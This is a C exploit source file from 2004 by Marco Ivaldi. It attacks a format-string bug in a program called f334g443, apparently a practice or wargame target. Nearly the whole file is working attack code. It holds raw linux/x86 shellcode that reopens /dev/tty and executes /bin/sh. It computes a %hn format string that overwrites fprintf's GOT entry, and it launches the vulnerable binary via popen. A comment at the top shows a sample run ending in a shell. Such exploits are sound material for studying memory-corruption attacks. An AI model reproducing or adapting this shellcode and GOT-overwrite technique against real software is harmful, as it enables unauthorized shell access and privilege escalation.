/*
 * $Id: f334g443-ex2.c,v 1.1.1.1 2004/05/29 14:15:04 raptor Exp $
 *
 * f334g443-ex2.c - f334g443.c exploit (see http://www.bffffab0.info/)
 * Copyright (c) 2004 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This is another f334g443.c exploitation attempt. Now, i put the shellcode
 * in the environment and i use the popen() function to run the vulnerable
 * program. This technique may be combined with the previous one (see also
 * f334g443-ex.c) and/or with some offset bruteforcing for the format string.
 *
 * NOTE. This exploit will surely need some tweaking to work on your system
 * (and of course not all values of fprintf() address are accepted).
 * 
 * $ uname -a
 * Linux attack 2.4.20 #2 Mon Mar 17 22:02:15 PST 2003 i686 unknown
 * $ gcc --version
 * gcc (GCC) 3.2.2
 * $ readelf -a f334g443 | grep fprintf$
 * 08049630  00000107 R_386_JUMP_SLOT   080482e8   fprintf
 * $ ./f334g443-ex2
 * Using ret address       : 0xbfffffa4
 * Using fprintf() address : 0x8049630
 * Using pad string        : AAAAA
 * Using fmt string        : AAAA%.65440u%79$hn%.49243u%80$hn
 * [...]
 * sh-2.05b$
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define	VULN	"./f334g443"	// the vulnerable program
#define BUF	512		// max size of the malicious buffer
#define	FPRINTF	0x08049630	// fprintf() address in .got
#define	OFFSET	79		// offset to first address on stack
#define TUNING	10		// system-dependant (use NOPs instead?)

/* split an address in 2 words */
#define SPLITW( w1, w2, addr ) {	\
	w1 = (addr & 0x0000ffff);	\
	w2 = (addr & 0xffff0000) >> 16;	\
}

char sc[] = /* linux/x86 shellcode (8 + 23 + 24  = 55 bytes) */
/* close(0) */
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
/* open("/dev/tty", O_RDWR | ...) */
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
/* execve("/bin/sh", ["/bin/sh"], NULL) */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
	char 	buf[BUF];
	char	*p = buf;

	int 	offset = OFFSET, ret;
	int 	i, n1, n2, ret1, ret2;

	char	cmd[256], tmp[9], pad[8];
	FILE	*vuln;

	extern	char **environ;
	char	**ep = environ;
	char	*vp;
	int	env_size = 0;

	/* clean-up the environment */
	while (*ep) {
		vp = strchr(*ep, '=');
		*vp = 0x0;
		unsetenv(*ep);
		*ep = NULL;
		*ep++;
	}

	/* put the shellcode in envp */
	setenv("SC", sc, 1);
	env_size = strlen(sc) + 1 + strlen("SC") + 1;

	/* calculate the envp padding (hrm...) */
	for (i = 0; i < (4 - (env_size % 4)) + 4; i++)
		pad[i] = 'A';
	pad[i] = 0x0;

	/* put the padding in envp */
	setenv(pad, NULL, 1);
	env_size += strlen(pad) + 1 + 1;

	/* calculate retaddr */
	ret = 0xbffffffa - env_size - strlen(VULN) - TUNING;

	/* check command line for offsets */
	if (argc > 1)
		offset = atoi(argv[1]);

	/* split the ret address in 2 words */
	SPLITW(ret1, ret2, ret);

	/* initialize the malicious buffer */
	bzero(buf, BUF);

	/* initial padding */
	memset(p, 'A', 4);
	p += 4;

	/* calculate numeric arguments for the write string */
	n1 = (ret1 - strlen(buf))		% 0x10000;
	n2 = (ret2 - strlen(buf) - n1) 		% 0x10000;

	/* check for potentially dangerous numeric arguments below 10 */
	n1 += (n1 < 10) ? (0x10000) : (0);
	n2 += (n2 < 10) ? (0x10000) : (0);

	/* build the write string part of the format string */
	sprintf(p, "%%.%du%%%d$hn%%.%du%%%d$hn", n1, offset, n2, offset + 1);

	/* build the args for the vulnerable program */
	p = tmp;
	*((void **)p) = (void *)(FPRINTF);
	p += 4;
	*((void **)p) = (void *)(FPRINTF + 2);
	p += 4;
	*p = 0x0;

	/* build the command line for popen() */
	sprintf(cmd, "%s %s", VULN, tmp);

	/* print some output */
	fprintf(stderr, "Using ret address\t: %p\n", ret);
	fprintf(stderr, "Using fprintf() address\t: %p\n", FPRINTF);
	fprintf(stderr, "Using pad string\t: %s\n", pad);
	fprintf(stderr, "Using fmt string\t: %s\n\n", buf);

	/* run the vulnerable program */
	vuln = popen(cmd, "w");
	fprintf(vuln, "%s", buf);
	pclose(vuln);

	exit(0);
}
